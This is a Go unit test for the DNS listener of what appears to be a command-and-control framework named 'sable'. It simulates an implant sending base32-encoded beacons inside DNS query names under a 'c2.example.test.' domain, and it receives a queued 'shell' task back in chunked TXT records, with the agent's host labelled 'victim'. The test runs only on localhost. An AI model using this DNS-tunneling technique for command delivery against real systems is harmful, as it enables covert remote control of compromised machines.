package listener_test

import (
	"encoding/base32"
	"encoding/hex"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/aelder202/sable/internal/listener"
	"github.com/aelder202/sable/internal/nonce"
	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	mdns "github.com/miekg/dns"
)

func TestDNSHandlerDeliversQueuedTask(t *testing.T) {
	store := session.NewStore()
	store.Register(&session.Agent{
		ID:     "agent-1",
		Secret: testSecret,
	})
	largePayload := strings.Repeat("whoami", 1000)
	if err := store.EnqueueTask("agent-1", &protocol.Task{ID: "dns-task", Type: "shell", Payload: largePayload}); err != nil {
		t.Fatalf("EnqueueTask: %v", err)
	}

	domain := "c2.example.test."
	h := listener.NewDNSHandler(store, nonce.NewCache(5*time.Minute), domain)
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("ListenPacket: %v", err)
	}
	defer pc.Close()

	srv := &mdns.Server{PacketConn: pc, Handler: h}
	errCh := make(chan error, 1)
	go func() {
		errCh <- srv.ActivateAndServe()
	}()
	defer func() {
		_ = srv.Shutdown()
		select {
		case err := <-errCh:
			if err != nil && !strings.Contains(err.Error(), "use of closed network connection") {
				t.Fatalf("DNS server returned error: %v", err)
			}
		case <-time.After(time.Second):
			t.Fatal("DNS server did not shut down")
		}
	}()

	body := makeBeacon(t, "agent-1", testSecret, time.Now().Unix())
	chunks := listener.ChunkForDNS(body)
	client := &mdns.Client{Net: "udp", Timeout: time.Second, UDPSize: 4096}

	var finalResp *mdns.Msg
	var finalQName string
	for i, chunk := range chunks {
		msg := new(mdns.Msg)
		finalQName = dnsBeaconQName(chunk, i, len(chunks), "0123456789abcdef", "agent-1", domain)
		msg.SetQuestion(finalQName, mdns.TypeA)
		msg.SetEdns0(4096, false)
		msg.RecursionDesired = false

		resp, _, err := client.Exchange(msg, pc.LocalAddr().String())
		if err != nil {
			t.Fatalf("DNS exchange chunk %d: %v", i, err)
		}
		finalResp = resp
	}

	if finalResp == nil || len(finalResp.Answer) == 0 {
		t.Fatal("expected final DNS chunk response to include a TXT answer")
	}

	first, totalResponses := decodeDNSFrame(t, finalResp)
	if totalResponses <= 1 {
		t.Fatalf("expected a multi-frame DNS response, got %d frame", totalResponses)
	}
	encodedTask := append([]byte(nil), first...)
	for index := 1; index < totalResponses; index++ {
		msg := new(mdns.Msg)
		qname := "r." + padDNSNumber(index) + ".0123456789abcdef.agent-1." + domain
		msg.SetQuestion(qname, mdns.TypeTXT)
		msg.SetEdns0(4096, false)
		resp, _, err := client.Exchange(msg, pc.LocalAddr().String())
		if err != nil {
			t.Fatalf("retrieve response chunk %d: %v", index, err)
		}
		chunk, gotTotal := decodeDNSFrame(t, resp)
		if gotTotal != totalResponses {
			t.Fatalf("response total changed from %d to %d", totalResponses, gotTotal)
		}
		encodedTask = append(encodedTask, chunk...)
	}
	if len(encodedTask) == 0 {
		t.Fatal("expected TXT answer to contain encoded task bytes")
	}

	task, err := protocol.DecodeTask(encodedTask, testSecret)
	if err != nil {
		t.Fatalf("DecodeTask: %v", err)
	}
	if task.ID != "dns-task" || task.Type != "shell" || task.Payload != largePayload {
		t.Fatalf("unexpected DNS task: %+v", task)
	}

	agent, ok := store.Get("agent-1")
	if !ok {
		t.Fatal("agent missing after DNS beacon")
	}
	if agent.Hostname != "victim" || agent.OS != "linux" || agent.Arch != "amd64" || agent.LastSeen.IsZero() {
		t.Fatalf("agent metadata was not updated from DNS beacon: %+v", agent)
	}

	// Repeating the final query models a lost UDP response. The retained frame
	// must be returned without replaying or consuming the task again.
	retry := new(mdns.Msg)
	retry.SetQuestion(finalQName, mdns.TypeA)
	retry.SetEdns0(4096, false)
	retryResp, _, err := client.Exchange(retry, pc.LocalAddr().String())
	if err != nil {
		t.Fatal(err)
	}
	retryChunk, retryTotal := decodeDNSFrame(t, retryResp)
	if retryTotal != totalResponses || !strings.EqualFold(hex.EncodeToString(retryChunk), hex.EncodeToString(first)) {
		t.Fatal("lost-response retry did not return the retained first frame")
	}
}

func decodeDNSFrame(t *testing.T, message *mdns.Msg) ([]byte, int) {
	t.Helper()
	for _, answer := range message.Answer {
		txt, ok := answer.(*mdns.TXT)
		if !ok {
			continue
		}
		payload := strings.Join(txt.Txt, "")
		total := 1
		if strings.HasPrefix(payload, "v1:") {
			parts := strings.SplitN(payload, ":", 4)
			if len(parts) != 4 {
				t.Fatalf("invalid DNS frame %q", payload)
			}
			var err error
			total, err = strconv.Atoi(parts[1])
			if err != nil {
				t.Fatal(err)
			}
			payload = parts[3]
		}
		data, err := hex.DecodeString(payload)
		if err != nil {
			t.Fatal(err)
		}
		return data, total
	}
	t.Fatal("DNS response did not contain TXT data")
	return nil, 0
}

func dnsBeaconQName(chunk []byte, idx, total int, sessionID, agentID, domain string) string {
	encoded := strings.ToLower(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(chunk))
	return encoded + "." +
		padDNSNumber(idx) + "." +
		padDNSNumber(total) + "." +
		sessionID + "." +
		agentID + "." +
		domain
}

func padDNSNumber(value int) string {
	s := "0000" + strconv.Itoa(value)
	return s[len(s)-4:]
}
